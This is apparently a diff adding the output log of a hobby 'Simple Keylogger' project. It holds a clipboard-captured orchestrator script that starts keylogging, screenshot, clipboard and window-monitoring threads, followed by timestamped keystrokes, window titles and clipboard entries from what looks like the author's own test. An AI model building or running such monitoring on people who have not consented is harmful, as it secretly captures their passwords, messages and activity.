@@ -1,0 +1,121 @@
+[Clipboard] import threading
+import time
+
+from keylogger import start_keylogger
+from screenshot import capture_screenshot
+from clipboard_monitor import monitor_clipboard
+from window_monitor import monitor_active_window
+
+
+def main():
+
+    print("\n==============================")
+    print(" USER ACTIVITY MONITOR STARTED ")
+    print("==============================\n")
+
+    print("Press CTRL + C to stop the program.\n")
+
+    t1 = threading.Thread(target=start_keylogger, daemon=True)
+    t2 = threading.Thread(target=capture_screenshot, daemon=True)
+    t3 = threading.Thread(target=monitor_clipboard, daemon=True)
+    t4 = threading.Thread(target=monitor_active_window, daemon=True)
+
+    t1.start()
+    t2.start()
+    t3.start()
+    t4.start()
+
+    try:
+        while True:
+            time.sleep(1)
+
+    except KeyboardInterrupt:
+        print("\n[INFO] Program stopped by user.")
+        print("[INFO] Monitoring ended safely.")
+
+
+if _name_ == "_main_":
+    main()
+2026-03-15 23:28:20 [ACTIVE WINDOW] Simple Keylogger – main.py
+2026-03-15 23:29:06 [ACTIVE WINDOW] Program Manager
+2026-03-15 23:29:08 [ACTIVE WINDOW] Visual Studio Code
+2026-03-15 23:29:11 [ACTIVE WINDOW] Untitled-1 - Visual Studio Code
+2026-03-15 23:29:14 [Untitled-1 - Visual Studio Code] - Key.caps_lock
+2026-03-15 23:29:15 [Untitled-1 - Visual Studio Code] - h
+2026-03-15 23:29:15 [Untitled-1 - Visual Studio Code] - e
+2026-03-15 23:29:15 [Untitled-1 - Visual Studio Code] - l
+2026-03-15 23:29:15 [Untitled-1 - Visual Studio Code] - l
+2026-03-15 23:29:16 [Untitled-1 - Visual Studio Code] - o
+2026-03-15 23:29:16 [ACTIVE WINDOW] ● HELLO • Untitled-1 - Visual Studio Code
+2026-03-15 23:29:16 [● HELLO • Untitled-1 - Visual Studio Code] - Key.space
+2026-03-15 23:29:16 [● HELLO • Untitled-1 - Visual Studio Code] - c
+2026-03-15 23:29:17 [● HELLO C • Untitled-1 - Visual Studio Code] - y
+2026-03-15 23:29:17 [● HELLO CY • Untitled-1 - Visual Studio Code] - b
+2026-03-15 23:29:17 [ACTIVE WINDOW] ● HELLO CYB • Untitled-1 - Visual Studio Code
+2026-03-15 23:29:17 [● HELLO CYB • Untitled-1 - Visual Studio Code] - e
+2026-03-15 23:29:18 [● HELLO CYBE • Untitled-1 - Visual Studio Code] - Key.backspace
+2026-03-15 23:29:18 [● HELLO CYB • Untitled-1 - Visual Studio Code] - e
+2026-03-15 23:29:18 [ACTIVE WINDOW] ● HELLO CYBE • Untitled-1 - Visual Studio Code
+2026-03-15 23:29:18 [● HELLO CYBE • Untitled-1 - Visual Studio Code] - r
+2026-03-15 23:29:19 [● HELLO CYBER • Untitled-1 - Visual Studio Code] - s
+2026-03-15 23:29:19 [● HELLO CYBER • Untitled-1 - Visual Studio Code] - e
+2026-03-15 23:29:19 [ACTIVE WINDOW] ● HELLO CYBER • Untitled-1 - Visual Studio Code
+2026-03-15 23:29:19 [● HELLO CYBERSE • Untitled-1 - Visual Studio Code] - c
+2026-03-15 23:29:20 [● HELLO CYBERSEC • Untitled-1 - Visual Studio Code] - u
+2026-03-15 23:29:20 [● HELLO CYBERSECU • Untitled-1 - Visual Studio Code] - r
+2026-03-15 23:29:20 [ACTIVE WINDOW] ● HELLO CYBERSECUR • Untitled-1 - Visual Studio Code
+2026-03-15 23:29:20 [● HELLO CYBERSECUR • Untitled-1 - Visual Studio Code] - i
+2026-03-15 23:29:20 [● HELLO CYBERSECURI • Untitled-1 - Visual Studio Code] - t
+2026-03-15 23:29:20 [● HELLO CYBERSECURIT • Untitled-1 - Visual Studio Code] - y
+2026-03-15 23:29:21 [ACTIVE WINDOW] ● HELLO CYBERSECURITY • Untitled-1 - Visual Studio Code
+2026-03-15 23:29:21 [● HELLO CYBERSECURITY • Untitled-1 - Visual Studio Code] - Key.shift_r
+2026-03-15 23:29:22 [● HELLO CYBERSECURITY • Untitled-1 - Visual Studio Code] - Key.shift
+2026-03-15 23:29:22 [● HELLO CYBERSECURITY • Untitled-1 - Visual Studio Code] - !
+2026-03-15 23:29:22 [● HELLO CYBERSECURITY! • Untitled-1 - Visual Studio Code] - !
+2026-03-15 23:29:23 [ACTIVE WINDOW] ● HELLO CYBERSECURITY!! • Untitled-1 - Visual Studio Code
+2026-03-15 23:29:32 [ACTIVE WINDOW] 
+2026-03-15 23:29:36 [ACTIVE WINDOW] Google Chrome
+2026-03-15 23:29:40 [ACTIVE WINDOW] New Tab - Google Chrome
+2026-03-15 23:29:43 [ACTIVE WINDOW] 
+2026-03-15 23:29:45 [ACTIVE WINDOW] Search
+2026-03-15 23:29:48 [ACTIVE WINDOW] 
+2026-03-15 23:29:49 [ACTIVE WINDOW] WhatsApp
+2026-03-15 23:30:02 [ACTIVE WINDOW] Program Manager
+2026-03-15 23:30:10 [Program Manager] - h
+2026-03-15 23:30:10 [Program Manager] - e
+2026-03-15 23:30:10 [Program Manager] - l
+2026-03-15 23:30:11 [Program Manager] - l
+2026-03-15 23:30:11 [Program Manager] - o
+2026-03-15 23:30:11 [Program Manager] - Key.space
+2026-03-15 23:30:11 [Program Manager] - l
+2026-03-15 23:30:11 [Program Manager] - o
+2026-03-15 23:30:12 [Program Manager] - v
+2026-03-15 23:30:12 [Program Manager] - e
+2026-03-15 23:30:12 [Program Manager] - Key.space
+2026-03-15 23:30:14 [Program Manager] - c
+2026-03-15 23:30:14 [Program Manager] - y
+2026-03-15 23:30:14 [Program Manager] - b
+2026-03-15 23:30:14 [Program Manager] - e
+2026-03-15 23:30:14 [Program Manager] - r
+2026-03-15 23:30:15 [Program Manager] - s
+2026-03-15 23:30:15 [Program Manager] - e
+2026-03-15 23:30:15 [Program Manager] - c
+2026-03-15 23:30:15 [Program Manager] - u
+2026-03-15 23:30:16 [Program Manager] - r
+2026-03-15 23:30:16 [Program Manager] - i
+2026-03-15 23:30:16 [Program Manager] - t
+2026-03-15 23:30:16 [Program Manager] - y
+2026-03-15 23:30:21 [ACTIVE WINDOW] ● HELLO CYBERSECURITY!! • Untitled-1 - Visual Studio Code
+2026-03-15 23:30:27 [● HELLO CYBERSECURITY!! • Untitled-1 - Visual Studio Code] - Key.ctrl_l
+2026-03-15 23:30:27 [● HELLO CYBERSECURITY!! • Untitled-1 - Visual Studio Code] - 
+[Clipboard] CYBERSECURITY
+2026-03-15 23:30:34 [ACTIVE WINDOW] 
+2026-03-15 23:30:37 [ACTIVE WINDOW] Simple Keylogger – main.py
+2026-03-15 23:30:42 [Simple Keylogger – main.py] - Key.ctrl_l
+2026-03-15 23:30:42 [Simple Keylogger – main.py] - 
+[Clipboard] if __name__ == "__main__":
+
+2026-03-15 23:30:46 [Simple Keylogger – main.py] - Key.ctrl_l
+2026-03-15 23:30:46 [Simple Keylogger – main.py] - 
+[Clipboard] 
+
